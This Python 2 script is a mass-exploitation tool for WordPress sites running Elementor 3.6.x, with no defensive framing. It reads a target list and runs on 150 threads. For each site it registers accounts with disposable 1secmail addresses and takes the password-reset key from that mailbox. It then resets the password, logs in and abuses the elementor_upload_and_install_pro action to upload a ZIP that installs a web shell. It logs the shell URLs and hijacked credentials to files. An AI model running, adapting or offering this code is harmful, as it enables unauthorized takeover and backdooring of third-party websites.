import os,time,sys , requests, re , socket , random , string , base64 , json
from multiprocessing.dummy import Pool
from colorama import Fore
from colorama import init 

init(autoreset=True)

fr  =   Fore.RED
fg  =   Fore.GREEN

print """{}  
  [#] Coded By  : RxR HaCkEr 
	    elementor 3.6.0 => 3.6.2.

	    Options:
	    	#1 Domains 
	    	#2 Panels : domain/wp-login.php#username@password
	    
	    Script Detect Domains / Panels automatically
""".format(fg)

requests.urllib3.disable_warnings()

try:
    target = [i.strip() for i in open(sys.argv[1], mode='r').readlines()]
except IndexError:
    path = str(sys.argv[0]).split('\\')
    exit('\n  [!] Enter <' + path[len(path) - 1] + '> <sites.txt>')


headers = {'Connection': 'keep-alive',
			'Cache-Control': 'max-age=0',
			'Upgrade-Insecure-Requests': '1',
			'User-Agent': "Mozilla/6.4 (Windows NT 11.1) Gecko/2010102 Firefox/99.0",
			'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
			'Accept-Encoding': 'gzip, deflate',
			'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
            'referer': 'www.google.com'}


def ran(length):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(length))

def URLdomain(site):
    if 'http://' not in site and 'https://' not in site :
        site = 'http://'+site
    return site
def protocolChange(site):
	if('http://' in site):
		site = site.replace('http://','https://')
	elif ('https://' in site):
		site = site.replace('https://','http://')
	return site
def domain(site):
    if site.startswith("http://") :
        site = site.replace("http://","")
    elif site.startswith("https://") :
        site = site.replace("https://","")
    if 'www.' in site :
        site = site.replace("www.", "")
    site = site.rstrip()
    if site.split('/') :
        site = site.split('/')[0]
    while site[-1] == "/":
        pattern = re.compile('(.*)/')
        sitez = re.findall(pattern,site)
        site = sitez[0]
    return site

def addWWW(site):
    if site.startswith("http://"):
        site = site.replace("http://", "http://www.")
    elif site.startswith("https://"):
        site = site.replace("https://", "https://www.")
    else :
        site = 'http://www.'+site
    return site
class shellData:
	def __init__(self,domain="", url="", username="", mail="", password="",rpKey=""):
		self.domain = domain
		self.url = url
		self.username = username
		self.password = password
		self.mail = mail
		self.rpKey = rpKey
def MailCreator():
	try:
		apiCreate = requests.get('https://www.1secmail.com/api/v1/?action=genRandomMailbox',verify=False,timeout=15)
		if '@' in apiCreate.content:
			return json.loads(apiCreate.content)[0]
		else:
			print ' -| Mail API --> {}[Failed]'.format(fr)
			return False
	except:
		print ' -| Mail API --> {}[Failed]'.format(fr)
		return False
def mailsExtractor(login,domain):
	try:
		apiMails = requests.get('https://www.1secmail.com/api/v1/?action=getMessages&login='+login+'&domain='+domain,verify=False,timeout=15)
		try:
			return json.loads(apiMails.content)
		except :
			print ' -| Mail API --> {}[Failed]'.format(fr)
			return False
	except :
		print ' -| Mail API --> {}[Failed]'.format(fr)
		return False
def fetchMail(login,domain,id):
	try:
		apiMail = requests.get('https://www.1secmail.com/api/v1/?action=readMessage&login='+login+'&domain='+domain+'&id='+id,verify=False,timeout=15)
		mailContent = str(apiMail.content)

		if 'Message not found' in mailContent:
			return False
		else:
			try:
				return json.loads(mailContent)
			except :
				print ' -| Mail APIs --> {}[Failed]'.format(fr)
				return False
	except :
		print ' -| Mail API --> {}[Failed]'.format(fr)
		return False
def loginWP(shellObj) :
	try :
		url = shellObj.url
		username = shellObj.username
		password = shellObj.password
		headersLogin = {'Connection': 'keep-alive',
						'Cache-Control': 'max-age=0',
						'Upgrade-Insecure-Requests': '1',
						'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36',
						'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
						'Accept-Encoding': 'gzip, deflate',
						'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
						'referer': url+'/wp-admin/'}
		loginReq = reqLogin.get(url+'/wp-login.php',verify=False,headers=headers,timeout=15)
		try:
			submit = re.findall('class="button button-primary button-large" value="(.*?)"',loginReq)[0]
		except :
			submit = 'Log In'
		if not submit:
			submit = 'Log In'
		loginData = {'log': username, 'pwd': password, 'wp-submit': submit, 'redirect_to': url + '/wp-admin/' ,'testcookie': '1','Cookie': 'wordpress_test_cookie=WP+Cookie+check'}
		loginAttempt = reqLogin.post(url + '/wp-login.php', verify=False, data=loginData, headers=headersLogin, timeout=15).content

		if ('profile/login' in loginAttempt) :
			id = re.findall(re.compile('type="hidden" name="force_redirect_uri-(.*)" id='), loginAttempt)[0]
			myuserpro = re.findall(re.compile('name="_myuserpro_nonce" value="(.*)" /><input type="hidden" name="_wp_http_referer"'), loginAttempt)[0]
			loginData = {'template': 'login', 'unique_id': '{}'.format(id) , 'up_username': '0', 'user_action': '',
							'_myuserpro_nonce': myuserpro, '_wp_http_referer': '/profile/login/', 'action': 'userpro_process_form',
							'force_redirect_uri-{}'.format(id) : '0', 'group': 'default', 'redirect_uri-{}'.format(id) : '', 'shortcode': '',
							'user_pass-{}'.format(id) : password, 'username_or_email-{}'.format(id): username}
			loginAttempt = reqLogin.post(url + '/wp-admin/admin-ajax.php', verify=False, data=loginData, headers=headersLogin , timeout=15)

		check = reqLogin.get(url + '/wp-admin/', verify=False, headers=headers, timeout=15).content

		if  'wp-admin-bar-logout' in check :
			print ' -| ' + shellObj.url + '--> {}[Login Success]'.format(fg)
			return check
		else :
			if ('woocommerce-MyAccount' in check):
				print ' -| ' + shellObj.url +  '--> {}[woocommerce Block ]'.format(fr)
				open('my-account.txt', 'a').write(shellObj.url+"/wp-login.php#"+shellObj.username+'@'+shellObj.password + "\n")
				return False
			print ' -| ' + shellObj.url +  '--> {}[Login Failed ]'.format(fr)
			return False
	except :
		print ' -| ' + shellObj.url +  '--> {}[Login Failed ]'.format(fr)
		return False
def nonceExtractor(shellObj):
	try:
		loginContent = loginWP(shellObj)
		if loginContent :
			regexp = re.findall('"nonce":"(.*?)"},"conn',loginContent)[0]
			return regexp
		else:
			return
			shellObj.url = protocolChange(shellObj.url)
			loginContent = loginWP(shellObj)
			if loginContent:
				regexp = re.findall('"nonce":"(.*?)"},"conn',loginContent)[0]
				return regexp
			else:
				return False
	except:
		print ' -| ' + shellObj.url +  '--> {}[nonce Failed ]'.format(fr)
def Exploit(shellObj):
	try:
		nonce = nonceExtractor(shellObj)
		if nonce and isinstance(nonce, basestring):

			uploadUrl = shellObj.url + '/wp-admin/admin-ajax.php'
			payl0adData = { 'action' : 'elementor_upload_and_install_pro', '_nonce' : nonce }
			payl0adFiles = { 'fileToUpload' : (open('Files/Files.zip','rb')) }
			inject = reqLogin.post(uploadUrl, data=payl0adData, files=payl0adFiles,timeout=15)
			print inject.content
			if 'elementorProInstalled' in inject.content or '{"success":false,"data' in inject.content:
				print ' -| ' + shellObj.url + '--> {}[Succefully]'.format(fg)
				open("Shells.txt","a").write(shellObj.url + "/wp-content/plugins/ProKing/images/error_log.php\n")
			else:
				print ' -| ' + shellObj.url +  '--> {}[ upload Fail ]'.format(fr)
				return False
	except Exception as e:
		print ' -| ' + shellObj.url +  '--> {}[ upload Fail ]'.format(fr)
def addPWD(shellObj):
	try:
		if 'http://' in shellObj.url:
			shellObj.url = protocolChange(shellObj.url)
		headersRP = {'Connection': 'keep-alive',
			'Cache-Control': 'max-age=0',
			'Upgrade-Insecure-Requests': '1',
			'User-Agent': "Mozilla/6.4 (Windows NT 11.1) Gecko/2010102 Firefox/99.0",
			'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
			'Accept-Encoding': 'gzip, deflate',
			'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
			'referer':shellObj.url+"/wp-login.php?action=rp"}
		reqRP = requests.Session()
		try:
			injctpwd = reqRP.get(shellObj.url+ "/wp-login.php?action=rp&key=" + shellObj.rpKey + "&login="+shellObj.username, allow_redirects=True,verify=False,headers=headersRP,timeout=15).content
		except:
			shellObj.url = protocolChange(shellObj.url)
			injctpwd = reqRP.get(shellObj.url+ "/wp-login.php?action=rp&key=" + shellObj.rpKey + "&login="+shellObj.username, allow_redirects=True,verify=False,headers=headersRP,timeout=15).content

		payloadRP = {'key':shellObj.rpKey,'login':shellObj.username}
		injctpwd2 = reqRP.get(shellObj.url+ "/wp-login.php?action=rp", allow_redirects=True,verify=False,data=payloadRP,headers=headersRP,timeout=15).content
		
		try:
			submit = re.findall('class="button button-primary button-large" value="(.*?)"',injctpwd)[0]
		except :
			submit = 'Save Password'
		if not submit:
			submit = 'Save Password'


		shellObj.password = ran(3) + '$P3'+ ran(3)
		data_addpwd = {'pass1':shellObj.password,'pass2':shellObj.password,'rp_key':shellObj.rpKey,'wp-submit':submit}
		addpwd = reqRP.post(shellObj.url+ "/wp-login.php?action=resetpass", allow_redirects=True,verify=False,data=data_addpwd,headers=headersRP,timeout=15).content
		open('Logins.txt', 'a').write(shellObj.url+"/wp-login.php#"+shellObj.username+'@'+shellObj.password + "\n")
		print ' -| ' + shellObj.url + '--> {}[User Created]'.format(fg)
		Exploit(shellObj)
	except Exception as e:
		print ' -| ' + shellObj.url +  '--> {}[ nonce Failed ]'.format(fr)
		return False
def ExtractKey(shellObj,FirstRun=True):
	try:
		mailLogin = shellObj.mail.split('@')[0]
		mailDom =  shellObj.mail.split('@')[1]
		mailsList = mailsExtractor(mailLogin,mailDom)
		if mailsList :
			verifKey= False
			count = 0
			while count < len(mailsList) and not verifKey:
				mail = mailsList[count]
				mailContent = fetchMail(mailLogin,mailDom,str(mail["id"]))
				if mailContent and shellObj.domain in  mailContent["body"]:
					try:
						verifKey = re.findall('&key=(.*?)&login', mailContent["body"])[0]
					except Exception as e:
						pass
					if verifKey:
						shellObj.rpKey = str(verifKey)

						addPWD(shellObj)
						return
					else:
						count +=1
				else:
					count += 1
		if FirstRun :
			time.sleep(10)
			ExtractKey(shellObj,False)
		else:
			print ' -| ' + shellObj.url +  '--> {}[ Mail Not received ]'.format(fr)
			return False

	except :
		print ' -| ' + shellObj.url +  '--> {}[Failed Extract Key]'.format(fr)
		return False
# def registersExtractor(file):
# 	try:
# 		try:
# 			f = open('tmp/'+file+".txt", "r")
# 		except Exception as e:
# 			time.sleep(3)
# 			f = open('tmp/'+file+".txt", "r")
# 		for line in f:
# 			try:
# 				dataRegister = json.loads(line)
# 			except :
# 				print ' -| ' + shellObj.url +  '--> {}[Failed File Access]'.format(fr)
# 				pass
# 			shellObj = shellData(dataRegister["domain"],dataRegister["url"],dataRegister["username"],dataRegister["mail"])
# 			ExtractKey(shellObj)
# 		f.close()
# 		time.sleep(3)
# 		os.remove('tmp/'+file+".txt")
# 	except Exception as e:
# 		print e
# 		print ' -| --> {}[Failed File Access]'.format(fr)		

def register(shellObj):
	try:
		global countRegistred
		global registerFileName
		checkRegiser = requests.get(shellObj.url + "/wp-login.php?action=register", headers=headers, verify=False, timeout=15).content
		if 'registerform' in checkRegiser:
			shellObj.mail = MailCreator()
			if not shellObj.mail:
				return
			try:
				submit = re.findall('class="button button-primary button-large" value="(.*?)"',checkRegiser)[0]
			except:
				submit = 'Register'
			if not submit:
				submit = 'Register'
			shellObj.username = 'user_'+ran(6)
			dataRegister = {'user_login':shellObj.username,'user_email':shellObj.mail,'redirect_to':'','wp-submit':'submit'}
			registerReq = requests.post(shellObj.url + "/wp-login.php?action=register", data=dataRegister,headers=headers,timeout=15)
			if 'http://' in shellObj.url:
				httpsUrl = protocolChange(shellObj.url)
				registerReq = requests.post(httpsUrl + "/wp-login.php?action=register", data=dataRegister,headers=headers,timeout=15)
			ExtractKey(shellObj,True)
		else:
			print ' -| ' + shellObj.url +  '--> {}[Failed Register]'.format(fr)		
	except Exception as e:
		print ' -| ' + shellObj.url +  '--> {}[Failed Register]'.format(fr)		
def checkVuln(url):
	try :
		dom = domain(url)
		url = URLdomain(dom)
		try:
			socket.gethostbyname(dom)
		except:
			print ' -| ' + url + ' --> {}[DomainNotwork]'.format(fr)
			return
		try:
			check = requests.get(url + "/wp-content/plugins/elementor/readme.txt", headers=headers, verify=False, timeout=15).content
		except :
			url = protocolChange(url)
			try:
				check = requests.get(url + "/wp-content/plugins/elementor/readme.txt", headers=headers, verify=False, timeout=15).content
			except:
						dom = addWWW(domain(url))
						url = URLdomain(dom)
						try:
							check = requests.get(url + "/wp-content/plugins/elementor/readme.txt", headers=headers, verify=False, timeout=15).content
						except :
							url = protocolChange(url)
							try:
								check = requests.get(url + "/wp-content/plugins/elementor/readme.txt", headers=headers, verify=False, timeout=15).content
							except:
								print ' -| ' + url +  '--> {}[Failed]'.format(fr)
		if "3.6." in check or "3.5." in check:
			open("Vulnhackkk.txt","a").write(url + "\n")
			print ' -| ' + url + '--> {}[Vuln]'.format(fg)
			data = shellData(dom,url)
			register(data)
		else :
			print ' -| ' + url +  '--> {}[Failed]'.format(fr)
	except :
		print ' -| ' + url + '--> {}[Failed]'.format(fr)

def Main(url) :
	try:
		if(re.findall(re.compile('http(.*)/(.*)#(.*)@(.*)'), url)):
			dataLogin = re.findall(re.compile('(.*)/wp-login.php#(.*)@(.*)'), url)[0]
			web = dataLogin[0]
			username = dataLogin[1]
			password = dataLogin[2]
			data = shellData(domain(web),web,username,'',password,'')
			Exploit(data)
		else:
			checkVuln(url)
	except :
		print ' -| ' + url +  '--> {}[Failed]'.format(fr)


reqLogin = requests.session()
mp = Pool(150)
mp.map(Main, target)
mp.close()
mp.join()